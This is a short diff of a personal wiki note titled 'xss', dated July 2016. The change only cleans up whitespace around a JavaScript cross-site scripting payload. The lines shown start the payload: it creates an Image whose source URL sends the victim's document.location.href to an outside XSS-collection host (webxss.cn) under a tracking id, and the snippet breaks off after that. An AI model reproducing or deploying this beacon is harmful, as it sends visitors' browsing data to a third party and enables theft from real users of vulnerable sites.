@@ -5,8 +5,7 @@ Creation-Date: 2016-07-20T10:36:36+08:00
 ====== xss ======
 Created Wednesday 20 July 2016
 
-﻿﻿﻿
-(function () {
+ (function () {
 	(new Image()).src = 'http://webxss.cn/index.php?do=api&id=ykRoYi&location=' + escape((function () {
 		try {
 			return document.location.href
